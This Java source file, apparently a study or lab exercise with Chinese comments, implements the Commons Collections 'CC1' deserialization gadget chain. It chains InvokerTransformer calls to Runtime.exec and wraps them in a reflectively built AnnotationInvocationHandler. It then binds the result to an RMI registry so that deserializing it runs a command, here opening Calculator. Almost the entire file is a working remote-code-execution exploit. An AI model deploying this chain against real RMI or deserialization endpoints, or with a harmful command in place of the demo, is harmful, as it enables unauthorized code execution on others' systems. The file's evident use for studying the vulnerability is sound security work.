package RMITest4.RMIServer;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Naming;
import java.rmi.Remote;
import java.util.HashMap;
import java.util.Map;

public class RMIServerTest4 {
    // 注册中心的服务器ip
    public static final String RMI_HOST = "127.0.0.1";

    // 注册中心设置的开放端口
    public static final int RMI_PORT = 9998;

    // RMI服务名称
    public static final String RMI_NAME = "rmi://" + RMI_HOST + ":" + RMI_PORT + "/t4";

    public static void main(String[] args) {
        try {
            String cmd = "open -a /System/Applications/Calculator.app";
            InvocationHandler payload = getPayload(cmd);

            Remote remote = Remote.class.cast(Proxy.newProxyInstance(RMITestImpl4.class.getClassLoader(), new Class[]{Remote.class}, payload));

            // 功能: 注册恶意类到RMI注册中心触发反序列化
            Naming.bind(RMI_NAME, remote);

            System.out.println("执行完毕");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * CC1反序列化
     *
     * @param cmd
     * @return
     * @throws Exception
     */
    private static InvocationHandler getPayload(String cmd) throws Exception {
        //构建一个 transformers 的数组,在其中构建了任意函数执行的核心代码
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{cmd}
                )
        };

        // 将 transformers 数组存入 ChaniedTransformer 这个继承类
        Transformer transformerChain = new ChainedTransformer(transformers);

        // 创建个 Map 准备拿来绑定 transformerChina
        Map innerMap = new HashMap();
        // put 第一个参数必须为 value, 第二个参数随便写
        innerMap.put("value", "xxxx");

        // 创建个 transformerChina 并绑定 innerMap
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

        // 反射机制调用AnnotationInvocationHandler类的构造函数
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = clazz.getDeclaredConstructor(Class.class, Map.class);

        //取消构造函数修饰符限制
        ctor.setAccessible(true);

        //获取 AnnotationInvocationHandler 类实例
        InvocationHandler instance = (InvocationHandler) ctor.newInstance(Retention.class, outerMap);
        return instance;
    }
}
